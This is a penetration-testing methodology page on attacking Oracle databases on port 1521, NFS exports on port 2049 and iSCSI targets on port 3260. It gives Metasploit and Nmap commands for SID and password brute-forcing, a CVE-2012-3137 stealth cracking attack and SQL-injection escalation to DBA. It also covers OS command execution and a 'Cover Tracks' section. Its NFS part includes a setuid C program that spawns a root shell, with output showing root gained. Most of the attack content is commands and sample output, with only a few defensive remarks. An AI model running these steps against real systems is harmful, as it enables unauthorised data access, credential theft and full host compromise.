<h2>Oracle - Port 1521<a class="headerlink" href="#oracle-port-1521" title="Permalink to this headline">¶</a></h2>
<p>After setting up oracle with metasploit here <a class="reference external" href="https://github.com/rapid7/metasploit-framework/wiki/How-to-get-Oracle-Support-working-with-Kali-Linux">How to get Oracle Support working with Kali Linux</a> We will directly follow the procedure presented by Chris Gates <a class="reference external" href="http://www.blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-SLIDES.pdf">BHUSA09-Gates-OracleMetasploit-Slides</a></p>
<div class="section" id="oracle-attack-methodology">
<h3>Oracle Attack Methodology<a class="headerlink" href="#oracle-attack-methodology" title="Permalink to this headline">¶</a></h3>
<p>We need 4 things to connect to an Oracle DB.</p>
<ul class="simple">
<li>IP.</li>
<li>Port.</li>
<li>Service Identifier (SID).</li>
<li>Username/Password.</li>
</ul>
<div class="section" id="locate-oracle-systems">
<h4>Locate Oracle Systems<a class="headerlink" href="#locate-oracle-systems" title="Permalink to this headline">¶</a></h4>
<p>Nmap would probably be the best tool to find the oracle instances.</p>
</div>
<div class="section" id="determine-oracle-version">
<h4>Determine Oracle Version<a class="headerlink" href="#determine-oracle-version" title="Permalink to this headline">¶</a></h4>
<p>Metasploit has</p>
<ul class="simple">
<li><strong>Oracle TNS Listener Service Version Query</strong></li>
</ul>
<blockquote>
<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">oracle</span><span class="o">/</span><span class="n">tnslsnr_version</span>
<span class="n">services</span> <span class="o">-</span><span class="n">p</span> <span class="mi">1521</span> <span class="o">-</span><span class="n">u</span> <span class="o">-</span><span class="n">R</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">1521</span> <span class="n">Oracle</span> <span class="o">-</span> <span class="n">Version</span><span class="p">:</span> <span class="mi">64</span><span class="o">-</span><span class="n">bit</span> <span class="n">Windows</span><span class="p">:</span> <span class="n">Version</span> <span class="mf">11.1</span><span class="o">.</span><span class="mf">0.7</span><span class="o">.</span><span class="mi">0</span> <span class="o">-</span> <span class="n">Production</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">1521</span> <span class="n">Oracle</span> <span class="o">-</span> <span class="n">Version</span><span class="p">:</span> <span class="n">Unknown</span> <span class="o">-</span> <span class="n">Error</span> <span class="n">code</span> <span class="mi">1189</span> <span class="o">-</span> <span class="n">The</span> <span class="n">listener</span> <span class="n">could</span> <span class="ow">not</span> <span class="n">authenticate</span> <span class="n">the</span> <span class="n">user</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">1521</span> <span class="n">Oracle</span> <span class="o">-</span> <span class="n">Version</span><span class="p">:</span> <span class="n">Unknown</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Scanned</span>  <span class="mi">8</span> <span class="n">of</span> <span class="mi">12</span> <span class="n">hosts</span> <span class="p">(</span><span class="mi">66</span><span class="o">%</span> <span class="n">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">1521</span> <span class="n">Oracle</span> <span class="o">-</span> <span class="n">Version</span><span class="p">:</span> <span class="mi">32</span><span class="o">-</span><span class="n">bit</span> <span class="n">Windows</span><span class="p">:</span> <span class="n">Version</span> <span class="mf">10.2</span><span class="o">.</span><span class="mf">0.1</span><span class="o">.</span><span class="mi">0</span> <span class="o">-</span> <span class="n">Production</span>
</pre></div>
</div>
</div></blockquote>
</div>
<div class="section" id="determine-oracle-sid">
<h4>Determine Oracle SID<a class="headerlink" href="#determine-oracle-sid" title="Permalink to this headline">¶</a></h4>
<p>Oracle Service Identifier: By querying the TNS Listener directly, brute force for default SID&#8217;s or query other components that may contain it.</p>
<p><strong>Metasploit</strong> has</p>
<ul class="simple">
<li><strong>Oracle TNS Listener SID Enumeration</strong>: This module simply queries the TNS listner for the Oracle SID. With Oracle 9.2.0.8 and above the listener will be protected and the SID will have to be bruteforced or guessed.</li>
</ul>
<blockquote>
<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">oracle</span><span class="o">/</span><span class="n">sid_enum</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><strong>Oracle TNS Listener SID Bruteforce</strong>:   This module queries the TNS listner for a valid Oracle database instance name (also known as a SID). Any response other than a &#8220;reject&#8221; will be considered a success. If a specific SID is provided, that SID will be attempted. Otherwise, SIDs read from the named file will be attempted in sequence instead.</li>
</ul>
<blockquote>
<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">oracle</span><span class="o">/</span><span class="n">sid_brute</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.140</span><span class="o">.</span><span class="mf">200.163</span><span class="p">:</span><span class="mi">1521</span>   <span class="o">-</span>  <span class="o">-</span> <span class="n">Oracle</span> <span class="o">-</span> <span class="n">Checking</span> <span class="s1">&#39;SA0&#39;</span><span class="o">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.140</span><span class="o">.</span><span class="mf">200.163</span><span class="p">:</span><span class="mi">1521</span>   <span class="o">-</span>  <span class="o">-</span> <span class="n">Oracle</span> <span class="o">-</span> <span class="n">Refused</span> <span class="s1">&#39;SA0&#39;</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.140</span><span class="o">.</span><span class="mf">200.163</span><span class="p">:</span><span class="mi">1521</span>   <span class="o">-</span>  <span class="o">-</span> <span class="n">Oracle</span> <span class="o">-</span> <span class="n">Checking</span> <span class="s1">&#39;PLSEXTPROC&#39;</span><span class="o">...</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.140</span><span class="o">.</span><span class="mf">200.163</span><span class="p">:</span><span class="mi">1521</span>   <span class="o">-</span> <span class="mf">10.140</span><span class="o">.</span><span class="mf">200.163</span><span class="p">:</span><span class="mi">1521</span> <span class="n">Oracle</span> <span class="o">-</span> <span class="s1">&#39;PLSEXTPROC&#39;</span> <span class="ow">is</span> <span class="n">valid</span>
</pre></div>
</div>
</div></blockquote>
<p><strong>Nmap</strong> has:</p>
<ul class="simple">
<li><a class="reference external" href="https://nmap.org/nsedoc/scripts/oracle-sid-brute.html">Oracle-sid-brute.nse</a> : Guesses Oracle instance/SID names against the TNS-listener.</li>
</ul>
<blockquote>
<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">--</span><span class="n">script</span><span class="o">=</span><span class="n">oracle</span><span class="o">-</span><span class="n">sid</span><span class="o">-</span><span class="n">brute</span> <span class="o">--</span><span class="n">script</span><span class="o">-</span><span class="n">args</span><span class="o">=</span><span class="n">oraclesids</span><span class="o">=/</span><span class="n">path</span><span class="o">/</span><span class="n">to</span><span class="o">/</span><span class="n">sidfile</span> <span class="o">-</span><span class="n">p</span> <span class="mi">1521</span><span class="o">-</span><span class="mi">1560</span> <span class="o">&lt;</span><span class="n">host</span><span class="o">&gt;</span>
<span class="n">nmap</span> <span class="o">--</span><span class="n">script</span><span class="o">=</span><span class="n">oracle</span><span class="o">-</span><span class="n">sid</span><span class="o">-</span><span class="n">brute</span> <span class="o">-</span><span class="n">p</span> <span class="mi">1521</span><span class="o">-</span><span class="mi">1560</span> <span class="o">&lt;</span><span class="n">host</span><span class="o">&gt;</span>
</pre></div>
</div>
</div></blockquote>
<p>A good white paper on guessing the Service Identifier is <a class="reference external" href="http://www.dsecrg.com/files/pub/pdf/Different_ways_to_guess_Oracle_database_SID_(eng).pdf">Different ways to guess Oracle database SID</a></p>
</div>
<div class="section" id="guess-bruteforce-user-pass">
<h4>Guess/Bruteforce USER/PASS<a class="headerlink" href="#guess-bruteforce-user-pass" title="Permalink to this headline">¶</a></h4>
<p>Once we know the service identifier, we need to find out a valid username and password..</p>
<p><strong>Metasploit</strong> has</p>
<ul class="simple">
<li><strong>Oracle RDBMS Login Utility</strong>: It actually runs nmap in the background, requires RHOSTS, RPORTS, SID to test the default usernames and passwords.</li>
</ul>
<blockquote>
<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">oracle</span><span class="o">/</span><span class="n">oracle_login</span>
</pre></div>
</div>
</div></blockquote>
<p><strong>Nmap</strong> has</p>
<ul class="simple">
<li><a class="reference external" href="https://nmap.org/nsedoc/scripts/oracle-brute.html">Oracle-brute.nse</a> Performs brute force password auditing against Oracle servers. Running it in default mode it performs an audit against a list of common Oracle usernames and passwords. The mode can be changed by supplying the argument oracle-brute.nodefault at which point the script will use the username- and password- lists supplied with Nmap. The script makes no attempt to discover the amount of guesses that can be made before locking an account. Running this script may therefor result in a large number of accounts being locked out on the database server.</li>
</ul>
<blockquote>
<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">--</span><span class="n">script</span> <span class="n">oracle</span><span class="o">-</span><span class="n">brute</span> <span class="o">-</span><span class="n">p</span> <span class="mi">1521</span> <span class="o">--</span><span class="n">script</span><span class="o">-</span><span class="n">args</span> <span class="n">oracle</span><span class="o">-</span><span class="n">brute</span><span class="o">.</span><span class="n">sid</span><span class="o">=</span><span class="n">ORCL</span> <span class="o">&lt;</span><span class="n">host</span><span class="o">&gt;</span>
</pre></div>
</div>
</div></blockquote>
<ul>
<li><p class="first"><a class="reference external" href="https://nmap.org/nsedoc/scripts/oracle-brute-stealth.html">oracle-brute-stealth.nse</a> : Exploits the CVE-2012-3137 vulnerability, a weakness in Oracle&#8217;s O5LOGIN authentication scheme. The vulnerability exists in Oracle 11g R1/R2 and allows linking the session key to a password hash. When initiating an authentication attempt as a valid user the server will respond with a session key and salt. Once received the script will disconnect the connection thereby not recording the login attempt. The session key and salt can then be used to brute force the users password.</p>
<p>CVE-2012-3137: The authentication protocol in Oracle Database Server 10.2.0.3, 10.2.0.4, 10.2.0.5, 11.1.0.7, 11.2.0.2, and 11.2.0.3 allows remote attackers to obtain the session key and salt for arbitrary users, which leaks information about the cryptographic hash and makes it easier to conduct brute force password guessing attacks, aka &#8220;stealth password cracking vulnerability.</p>
</li>
</ul>
<blockquote>
<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">--</span><span class="n">script</span> <span class="n">oracle</span><span class="o">-</span><span class="n">brute</span><span class="o">-</span><span class="n">stealth</span> <span class="o">-</span><span class="n">p</span> <span class="mi">1521</span> <span class="o">--</span><span class="n">script</span><span class="o">-</span><span class="n">args</span> <span class="n">oracle</span><span class="o">-</span><span class="n">brute</span><span class="o">-</span><span class="n">stealth</span><span class="o">.</span><span class="n">sid</span><span class="o">=</span><span class="n">ORCL</span> <span class="o">&lt;</span><span class="n">host</span><span class="o">&gt;</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><a class="reference external" href="https://nmap.org/nsedoc/scripts/oracle-enum-users.html">Oracle-enum-users</a> : Attempts to enumerate valid Oracle user names against unpatched Oracle 11g servers (this bug was fixed in Oracle&#8217;s October 2009 Critical Patch Update).</li>
</ul>
<blockquote>
<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">--</span><span class="n">script</span> <span class="n">oracle</span><span class="o">-</span><span class="n">enum</span><span class="o">-</span><span class="n">users</span> <span class="o">--</span><span class="n">script</span><span class="o">-</span><span class="n">args</span> <span class="n">oracle</span><span class="o">-</span><span class="n">enum</span><span class="o">-</span><span class="n">users</span><span class="o">.</span><span class="n">sid</span><span class="o">=</span><span class="n">ORCL</span><span class="p">,</span><span class="n">userdb</span><span class="o">=</span><span class="n">orausers</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">p</span> <span class="mi">1521</span><span class="o">-</span><span class="mi">1560</span> <span class="o">&lt;</span><span class="n">host</span><span class="o">&gt;</span>
</pre></div>
</div>
</div></blockquote>
</div>
<div class="section" id="privilege-escalation-via-sql-injection">
<h4>Privilege Escalation via SQL Injection<a class="headerlink" href="#privilege-escalation-via-sql-injection" title="Permalink to this headline">¶</a></h4>
<ul class="simple">
<li>lt_findricset.rb</li>
<li>lt_findricset_cursor.rb: Oracle DB SQL Injection via SYS.LT.FINDRICSET Evil Cursor Method:   This module will escalate a Oracle DB user to DBA by exploiting an sql injection bug in the SYS.LT.FINDRICSET package via Evil Cursor technique. Tested on oracle 10.1.0.3.0 &#8211; should work on thru 10.1.0.5.0 and supposedly on 11g. Fixed with Oracle Critical Patch update October 2007.</li>
</ul>
<blockquote>
<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">sqli</span><span class="o">/</span><span class="n">oracle</span><span class="o">/</span><span class="n">lt_findricset_cursor</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li>dbms_metadata_open.rb: Oracle DB SQL Injection via SYS.DBMS_METADATA.OPEN:   This module will escalate a Oracle DB user to DBA by exploiting an sql injection bug in the SYS.DBMS_METADATA.OPEN package/function.</li>
<li>dbms_cdc_ipublish: Oracle DB SQL Injection via SYS.DBMS_CDC_IPUBLISH.ALTER_HOTLOG_INTERNAL_CSOURCE:   The module exploits an sql injection flaw in the ALTER_HOTLOG_INTERNAL_CSOURCE procedure of the PL/SQL package</li>
<li>DBMS_CDC_IPUBLISH. Any user with execute privilege on the vulnerable package can exploit this vulnerability. By default, users granted EXECUTE_CATALOG_ROLE have the required privilege. Affected versions:  Oracle Database Server versions 10gR1, 10gR2 and 11gR1. Fixed with October 2008 CPU.</li>
<li>dbms_cdc_publish: Oracle DB SQL Injection via SYS.DBMS_CDC_PUBLISH.ALTER_AUTOLOG_CHANGE_SOURCE: The module exploits an sql injection flaw in the ALTER_AUTOLOG_CHANGE_SOURCE procedure of the PL/SQL package</li>
<li>DBMS_CDC_PUBLISH. Any user with execute privilege on the vulnerable package can exploit this vulnerability. By default, users granted EXECUTE_CATALOG_ROLE have the required privilege. Affected versions: Oracle Database Server versions 10gR1, 10gR2 and 11gR1. Fixed with October 2008 CPU.</li>
<li>dbms_cdc_publish2: Oracle DB SQL Injection via SYS.DBMS_CDC_PUBLISH.DROP_CHANGE_SOURCE: The module exploits an sql injection flaw in the DROP_CHANGE_SOURCE procedure of the PL/SQL package DBMS_CDC_PUBLISH. Any user with execute privilege on the vulnerable package can exploit this vulnerability. By default, users granted EXECUTE_CATALOG_ROLE have the required privilege.</li>
<li>dbms_cdc_publish3: Oracle DB SQL Injection via SYS.DBMS_CDC_PUBLISH.CREATE_CHANGE_SET: The module exploits an sql injection flaw in the CREATE_CHANGE_SET procedure of the PL/SQL package DBMS_CDC_PUBLISH. Any user with execute privilege on the vulnerable package can exploit this vulnerability. By default, users granted EXECUTE_CATALOG_ROLE have the required privilege.</li>
<li>dbms_cdc_subscribe_activate_subscription: Oracle DB SQL Injection via SYS.DBMS_CDC_SUBSCRIBE.ACTIVATE_SUBSCRIPTION: This module will escalate a Oracle DB user to DBA by exploiting an sql injection bug in the SYS.DBMS_CDC_SUBSCRIBE.ACTIVATE_SUBSCRIPTION package/function. This vulnerability affects to Oracle Database Server 9i up to 9.2.0.5 and 10g up to 10.1.0.4.</li>
<li>lt_compressworkspace.rb: Oracle DB SQL Injection via SYS.LT.COMPRESSWORKSPACE:   This module exploits an sql injection flaw in the COMPRESSWORKSPACE procedure of the PL/SQL package SYS.LT. Any user with execute privilege on the vulnerable package can exploit this vulnerability.</li>
<li>lt_mergeworkspace.rb: Oracle DB SQL Injection via SYS.LT.MERGEWORKSPACE:   This module exploits an sql injection flaw in the MERGEWORKSPACE procedure of the PL/SQL package SYS.LT. Any user with execute privilege on the vulnerable package can exploit this vulnerability.</li>
<li>lt_removeworkspace.rb: Oracle DB SQL Injection via SYS.LT.REMOVEWORKSPACE:   This module exploits an sql injection flaw in the REMOVEWORKSPACE procedure of the PL/SQL package SYS.LT. Any user with execute privilege on the vulnerable package can exploit this vulnerability.</li>
<li>lt_rollbackworkspace.rb: Oracle DB SQL Injection via SYS.LT.ROLLBACKWORKSPACE:   This module exploits an sql injection flaw in the ROLLBACKWORKSPACE procedure of the PL/SQL package SYS.LT. Any user with execute privilege on the vulnerable package can exploit this vulnerability.</li>
</ul>
</div>
<div class="section" id="manipulate-data-post-exploitation">
<h4>Manipulate Data/Post Exploitation<a class="headerlink" href="#manipulate-data-post-exploitation" title="Permalink to this headline">¶</a></h4>
<p>The above privilege escalation exploits will provide us DBA access, from where we can access the data. We can use</p>
<ul class="simple">
<li>Metasploit oracle_sql: Oracle SQL Generic Query: This module allows for simple SQL statements to be executed against a Oracle instance given the appropriate credentials and sid.</li>
</ul>
<blockquote>
<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="n">oracle</span><span class="o">/</span><span class="n">oracle_sql</span>
</pre></div>
</div>
<p>or you can directly connect to the database using</p>
</div></blockquote>
<ul class="simple">
<li>SQLPlus</li>
</ul>
<blockquote>
<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">sqlplus</span> <span class="n">username</span><span class="o">/</span><span class="n">password</span><span class="nd">@host</span><span class="p">:</span><span class="n">port</span><span class="o">/</span><span class="n">service</span>
</pre></div>
</div>
<p>or use tnsnames.ora file to connect to the database. For that edit it and add a new entry: This file normally resides in the $ORACLE HOMENETWORKADMIN directory.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">myDb</span>  <span class="o">=</span>
 <span class="p">(</span><span class="n">DESCRIPTION</span> <span class="o">=</span>
   <span class="p">(</span><span class="n">ADDRESS_LIST</span> <span class="o">=</span>
     <span class="p">(</span><span class="n">ADDRESS</span> <span class="o">=</span> <span class="p">(</span><span class="n">PROTOCOL</span> <span class="o">=</span> <span class="n">TCP</span><span class="p">)(</span><span class="n">Host</span> <span class="o">=</span> <span class="n">c</span><span class="p">)(</span><span class="n">Port</span> <span class="o">=</span><span class="n">a</span><span class="p">))</span>
   <span class="p">)</span>
 <span class="p">(</span><span class="n">CONNECT_DATA</span> <span class="o">=</span>
   <span class="p">(</span><span class="n">SERVICE_NAME</span> <span class="o">=</span><span class="n">b</span><span class="p">)</span>
 <span class="p">)</span>
<span class="p">)</span>
</pre></div>
</div>
<p>and then you could connect to the db:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">sqlplus</span> <span class="n">x</span><span class="o">/</span><span class="n">y</span><span class="nd">@myDb</span>
</pre></div>
</div>
<p>However, there&#8217;s more to Post Exploitation which are OS Shells. There are multiple methods for running OS commands via oracle libraries.</p>
</div></blockquote>
<ul>
<li><p class="first">Via Java:</p>
<p>There&#8217;s a metasploit</p>
</li>
</ul>
<blockquote>
<div><ul class="simple">
<li>win32exec: Oracle Java execCommand (Win32):   This module will create a java class which enables the execution of OS commands. First, we need to grant the user privileges of JAVASYSPRIVS using oracle_sql module</li>
</ul>
<blockquote>
<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="n">oracle</span><span class="o">/</span><span class="n">post_exploitation</span><span class="o">/</span><span class="n">win32exec</span>
</pre></div>
</div>
<p>This can also be done by executing SQL Scripts provided by oracle. For more information refer <a class="reference external" href="http://www.oracle.com/technetwork/database/enterprise-edition/calling-shell-commands-from-plsql-1-1-129519.pdf">Executing operating system commands from PL/ SQL</a></p>
</div></blockquote>
<ul class="simple">
<li>Extproc backdoors</li>
<li>DBMS_Scheduler</li>
</ul>
<blockquote>
<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">Run</span> <span class="n">custom</span> <span class="n">pl</span><span class="o">/</span><span class="n">sql</span> <span class="ow">or</span> <span class="n">java</span>
</pre></div>
</div>
</div></blockquote>
</div></blockquote>
</div>
<div class="section" id="cover-tracks">
<h4>Cover Tracks<a class="headerlink" href="#cover-tracks" title="Permalink to this headline">¶</a></h4>
<p><strong>Metasploit</strong> has</p>
<ul class="simple">
<li>We can use <strong>Oracle TNS Listener Checker</strong> which module checks the server for vulnerabilities like TNS Poison.</li>
</ul>
<blockquote>
<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">oracle</span><span class="o">/</span><span class="n">tnspoison_checker</span>
<span class="n">services</span> <span class="o">-</span><span class="n">p</span> <span class="mi">1521</span> <span class="o">-</span><span class="n">u</span> <span class="o">-</span><span class="n">R</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">1521</span> <span class="ow">is</span> <span class="n">vulnerable</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">1521</span> <span class="ow">is</span> <span class="n">vulnerable</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Scanned</span>  <span class="mi">2</span> <span class="n">of</span> <span class="mi">12</span> <span class="n">hosts</span> <span class="p">(</span><span class="mi">16</span><span class="o">%</span> <span class="n">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">1521</span> <span class="ow">is</span> <span class="ow">not</span> <span class="n">vulnerable</span>
</pre></div>
</div>
</div></blockquote>
<p>Some SQL statements which could be executed after SQL Plus connection:</p>
<blockquote>
<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="mf">1.</span> <span class="n">select</span> <span class="o">*</span> <span class="kn">from</span> <span class="nn">global_name</span>
</pre></div>
</div>
</div></blockquote>
<p>A good blog to secure oracle is <a class="reference external" href="http://blog.opensecurityresearch.com/2012/03/top-10-oracle-steps-to-secure-oracle.html">Top 10 Oracle Steps to a Secure Oracle Database Server</a></p>
</div>
</div>
</div>
<div class="section" id="nfs-port-2049">
<h2>NFS - Port 2049<a class="headerlink" href="#nfs-port-2049" title="Permalink to this headline">¶</a></h2>
<p>If the port number 2049 is open</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>$ nmap -A -T4 -sT -p1-65535 canyoupwnme
2049/tcp  open  nfs         2-4 (RPC #100003)
</pre></div>
</div>
<p>We can scan the available exports</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>$ showmount -e canyoupwnme
Export list for canyoupwnme:
/backup *
</pre></div>
</div>
<p>Now, let&#8217;s try to mount /backup and to get the content</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>$ mkdir backup
$ mount -o ro,noexec canyoupwnme:/backup backup
$ ls backup
backup.tar.bz2.zip
</pre></div>
</div>
<p>This is implemented by /etc/exports</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>www-data@Orcus:/$ cat /etc/exports
cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#              to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/tmp *(rw,no_root_squash)
</pre></div>
</div>
<p><strong>Do Not Use the no_root_squash Option</strong></p>
<p>By default, NFS shares change the root user to the nfsnobody user, an unprivileged user account. In this way, all root-created files are owned by nfsnobody, which prevents uploading of programs with the setuid bit set. If no_root_squash is used, remote root users are able to change any file on the shared file system and leave trojaned applications for other users to inadvertently execute.</p>
<p><strong>Note</strong> This is very dangerous if a) found on a linux box and b) you are unprivileged user on that linux box. Above we have mounted as read-only. However, we can mount as rw and copy a setuid program</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>int main(void) {
setgid(0); setuid(0);
execl(“/bin/sh”,”sh”,0); }
</pre></div>
</div>
<p>Compile it based on the architecture, give it setuid and executable permissions as root ( Remember, we mounted as root )</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">chown</span> <span class="n">root</span><span class="o">.</span><span class="n">root</span> <span class="o">./</span><span class="n">pwnme</span>
<span class="n">chmod</span> <span class="n">u</span><span class="o">+</span><span class="n">s</span> <span class="o">./</span><span class="n">pwnme</span>
</pre></div>
</div>
<p>Further, if we are unpriviledged user on that linux box, we can just execute this binary to become root.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>www-data@xxxxxhostcus:/tmp$ ./pwnme
./pwnme
# id
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
</pre></div>
</div>
</div>
<div class="section" id="iscsi-port-3260">
<h2>ISCSI - Port 3260<a class="headerlink" href="#iscsi-port-3260" title="Permalink to this headline">¶</a></h2>
<p>Internet Small Computer Systems Interface, an Internet Protocol (IP)-based storage networking standard for linking data storage facilities. A good article is <a class="reference external" href="https://pig.made-it.com/iSCSI.html">SCSI over IP</a></p>
<div class="section" id="id47">
<h3>Nmap<a class="headerlink" href="#id47" title="Permalink to this headline">¶</a></h3>
<div class="section" id="iscsi-info">
<h4>iscsi-info<a class="headerlink" href="#iscsi-info" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/iscsi-info.html">iscsi-info.nse</a>: Collects and displays information from remote iSCSI targets.</p>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>nmap -sV -p 3260 192.168.xx.xx --script=iscsi-info

Starting Nmap 7.01 ( https://nmap.org ) at 2016-05-04 14:50 IST
Nmap scan report for 192.168.xx.xx
Host is up (0.00064s latency).
PORT     STATE SERVICE VERSION
3260/tcp open  iscsi?
| iscsi-info:
|   iqn.1992-05.com.emc:fl1001433000190000-3-vnxe:
|     Address: 192.168.xx.xx:3260,1
|_    Authentication: NOT required
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 138.09 seconds
</pre></div>
</div>
</div>
</div>
<div class="section" id="id48">
<h3>Other<a class="headerlink" href="#id48" title="Permalink to this headline">¶</a></h3>
<div class="section" id="iscsiadm">
<h4>iscsiadm<a class="headerlink" href="#iscsiadm" title="Permalink to this headline">¶</a></h4>
<p>Hacking Team DIY shows to run</p>
<p>We can discover the target IP address by using the below command</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">iscsiadm</span> <span class="o">-</span><span class="n">m</span> <span class="n">discovery</span> <span class="o">-</span><span class="n">t</span> <span class="n">sendtargets</span> <span class="o">-</span><span class="n">p</span> <span class="mf">192.168</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="mf">192.168</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">3260</span><span class="p">,</span><span class="mi">1</span> <span class="n">iqn</span><span class="o">.</span><span class="mi">1992</span><span class="o">-</span><span class="mf">05.</span><span class="n">com</span><span class="o">.</span><span class="n">emc</span><span class="p">:</span><span class="n">fl1001433000190000</span><span class="o">-</span><span class="mi">3</span><span class="o">-</span><span class="n">vnxe</span>
</pre></div>
</div>
<p>Login via</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">iscsiadm</span> <span class="o">-</span><span class="n">m</span> <span class="n">node</span> <span class="o">--</span><span class="n">targetname</span><span class="o">=</span><span class="s2">&quot;iqn.1992-05.com.emc:fl1001433000190000-3-vnxe&quot;</span> <span class="o">-</span><span class="n">l</span> <span class="o">-</span><span class="n">p</span> <span class="mf">192.168</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span> <span class="o">--</span><span class="n">login</span> <span class="o">-</span>
<span class="n">Logging</span> <span class="ow">in</span> <span class="n">to</span> <span class="p">[</span><span class="n">iface</span><span class="p">:</span> <span class="n">default</span><span class="p">,</span> <span class="n">target</span><span class="p">:</span> <span class="n">iqn</span><span class="o">.</span><span class="mi">1992</span><span class="o">-</span><span class="mf">05.</span><span class="n">com</span><span class="o">.</span><span class="n">emc</span><span class="p">:</span><span class="n">fl1001433000190000</span><span class="o">-</span><span class="mi">3</span><span class="o">-</span><span class="n">vnxe</span><span class="p">,</span> <span class="n">portal</span><span class="p">:</span> <span class="mf">192.168</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">,</span><span class="mi">3260</span><span class="p">]</span> <span class="p">(</span><span class="n">multiple</span><span class="p">)</span>
